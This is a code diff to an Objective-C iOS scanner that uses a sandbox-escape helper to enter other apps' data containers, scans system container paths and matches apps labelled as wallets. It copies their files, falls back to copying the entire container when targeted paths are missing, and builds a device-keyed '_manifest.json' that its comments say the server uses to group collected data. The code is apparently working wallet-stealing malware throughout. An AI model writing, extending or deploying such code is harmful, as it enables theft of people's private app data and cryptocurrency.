@@ -3,6 +3,9 @@
 #import "WQLPathLeak.h"
 #import "WQLPathCache.h"
 #import "WQLLog.h"
+#import <UIKit/UIKit.h>
+#import <stdlib.h>
+#import <sys/sysctl.h>
 #import <stdarg.h>
 #import <sys/xattr.h>
 
@@ -20,6 +23,14 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 - (NSString *)relative:(NSString *)path fromContainer:(NSString *)container;
 - (uint64_t)sizeOfItemAtPath:(NSString *)path;
 - (NSString *)humanBytes:(uint64_t)b;
+- (void)writeWalletManifestInDirectory:(NSString *)outDir
+                               records:(NSArray<NSDictionary *> *)records;
+- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
+                                  forTarget:(WQLTarget *)t
+                                   bundleID:(NSString *)bundleID
+                                     outDir:(NSString *)outRoot
+                                      bytes:(uint64_t *)bytesOut;
+- (NSString *)productType;
 @end
 
 @implementation WQLScanner
@@ -46,6 +57,8 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     return @[
         @"/private/var/mobile/Containers/Data/Application",
         @"/private/var/mobile/Containers/Shared/AppGroup",
+        @"/private/var/mobile/Containers/Data/InternalDaemon",
+        @"/private/var/mobile/Containers/Data/PluginKitPlugin",
         @"/private/var/containers/Data/System",          // iOS 27
         @"/private/var/containers/Shared/SystemGroup",   // iOS 27
     ];
@@ -102,6 +115,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
             __weak typeof(self) weakSelf = self;
             __block uint64_t lastPct = 0;
+            BOOL completed = NO;
             NSDictionary<NSString *, NSArray<NSString *> *> *scanned =
                 [WQLPathLeak childrenOfDirectories:needScan
                                           maxInode:maxInode
@@ -116,11 +130,16 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
             } cancel:^BOOL{
                 __strong typeof(weakSelf) self = weakSelf;
                 return self ? (self.cancelBlock ? self.cancelBlock() : NO) : YES;
-            } error:&err];
+            } completed:&completed error:&err];
 
             if (scanned.count) {
                 [children addEntriesFromDictionary:scanned];
-                [[WQLPathCache shared] mergeScanned:scanned];
+                // 只有完整扫完才写缓存，否则下次会拿残缺列表当完整结果
+                if (completed) {
+                    [[WQLPathCache shared] mergeScanned:scanned];
+                } else {
+                    [self log:@"枚举被中断，本次结果不写入缓存"];
+                }
             }
         }
     }
@@ -143,17 +162,23 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
             NSString *escErr = nil;
             int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
             NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
-            WQLTarget *t = [WQLTargets matchBundleID:bundleID inTargets:targets];
+            BOOL fuzzy = NO;
+            WQLTarget *t = [WQLTargets matchBundleID:bundleID inTargets:targets fuzzy:&fuzzy];
 
             NSMutableDictionary *record = [@{
                 @"bundleId": bundleID ?: @"",
                 @"path": path,
                 @"target": t.name ?: @"",
                 @"status": t ? @"matched" : @"skip",
+                @"fuzzy": @(fuzzy),
                 @"files": @[],
                 @"bytes": @(0),
             } mutableCopy];
             [records addObject:record];
+
+            if (fuzzy) {
+                [self log:@"模糊命中: %@ → %@（采集前请确认不是同类无关 App）", bundleID, t.name];
+            }
 
             if (handle <= 0) {
                 record[@"status"] = [NSString stringWithFormat:@"escape_failed: %@",
@@ -174,6 +199,17 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                                               bundleID:bundleID
                                                 outDir:outDir
                                                  bytes:&bytes];
+
+            // 定点路径全部缺失（App 改版/升级）→ 退化为整容器，避免命中却空手
+            if (files.count == 0 && !t.wholeContainer) {
+                [self log:@"%@ (%@) 定点路径缺失，退化为整容器", t.name, bundleID];
+                files = [self copyWholeContainer:path
+                                       forTarget:t
+                                        bundleID:bundleID
+                                          outDir:outDir
+                                           bytes:&bytes];
+            }
+
             [[WQLEscape shared] releaseHandle:handle];
 
             record[@"files"] = files;
@@ -185,7 +221,9 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         }
     }
 
-    // 4. 落一份清单
+    // 4. 落清单：manifest.json 给本机看，_manifest.json 给服务端归类
+    [self writeWalletManifestInDirectory:outDir records:records];
+
     NSData *json = [NSJSONSerialization dataWithJSONObject:records
                                                    options:NSJSONWritingPrettyPrinted
                                                      error:nil];
@@ -280,6 +318,31 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     return copied;
 }
 
+- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
+                                  forTarget:(WQLTarget *)t
+                                   bundleID:(NSString *)bundleID
+                                     outDir:(NSString *)outRoot
+                                      bytes:(uint64_t *)bytesOut {
+    uint64_t sz = [self sizeOfItemAtPath:container];
+    if (sz > self.maxContainerBytes) {
+        [self log:@"%@ 整容器 %@ 超过门限，跳过", t.name, [self humanBytes:sz]];
+        return @[];
+    }
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID ?: @"unknown"];
+    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
+
+    NSError *e = nil;
+    if (![fm copyItemAtPath:container toPath:dst error:&e]) {
+        [self log:@"%@ 整容器兜底失败: %@", t.name, e.localizedDescription];
+        return @[];
+    }
+    if (bytesOut) *bytesOut = sz;
+    return @[dst];
+}
+
 /// sqlite 自动带 -wal / -shm 边车
 - (NSArray<NSString *> *)sourcesForPath:(NSString *)path {
     NSFileManager *fm = [NSFileManager defaultManager];
@@ -320,6 +383,71 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         if (total > self.maxContainerBytes) break;
     }
     return total;
+}
+
+#pragma mark - 服务端清单
+
+- (void)writeWalletManifestInDirectory:(NSString *)outDir
+                               records:(NSArray<NSDictionary *> *)records {
+    NSMutableArray *found = [NSMutableArray array];
+    NSMutableArray *wallets = [NSMutableArray array];
+
+    for (NSDictionary *r in records) {
+        NSString *name = r[@"target"];
+        if (!name.length) continue;
+        if (![found containsObject:name]) [found addObject:name];
+        [wallets addObject:@{
+            @"wallet": name,
+            @"bundleID": r[@"bundleId"] ?: @"",
+            @"bytes": r[@"bytes"] ?: @0,
+        }];
+    }
+
+    // 服务端用 idfv 做设备归集键；拿不到时退化为本机持久 UUID
+    NSString *idfv = [[UIDevice currentDevice] identifierForVendor].UUIDString;
+    if (!idfv.length) {
+        idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLDeviceToken"];
+        if (!idfv.length) {
+            idfv = NSUUID.UUID.UUIDString;
+            [[NSUserDefaults standardUserDefaults] setObject:idfv forKey:@"WQLDeviceToken"];
+            [[NSUserDefaults standardUserDefaults] synchronize];
+        }
+    }
+
+    UIDevice *dev = [UIDevice currentDevice];
+    NSDictionary *man = @{
+        // 服务端从 deviceFolder 里抓 UUID 作为设备归集键
+        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
+                          dev.model, dev.systemVersion, idfv],
+        @"ios": dev.systemVersion,
+        @"productType": [self productType],
+        @"found": found,
+        @"wallets": wallets,
+        @"source": @"WQLApp",
+    };
+
+    NSData *data = [NSJSONSerialization dataWithJSONObject:man
+                                                   options:NSJSONWritingPrettyPrinted
+                                                     error:nil];
+    if (data) {
+        NSString *p = [outDir stringByAppendingPathComponent:@"_manifest.json"];
+        [data writeToFile:p atomically:YES];
+        [self log:@"_manifest.json: found=%@", [found componentsJoinedByString:@","]];
+    }
+}
+
+- (NSString *)productType {
+    size_t size = 0;
+    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) != 0 || size == 0) return @"iPhone";
+    char *buf = malloc(size);
+    if (!buf) return @"iPhone";
+    NSString *model = @"iPhone";
+    if (sysctlbyname("hw.machine", buf, &size, NULL, 0) == 0) {
+        NSString *s = [NSString stringWithUTF8String:buf];
+        if (s) model = s;
+    }
+    free(buf);
+    return model;
 }
 
 - (NSString *)humanBytes:(uint64_t)b {
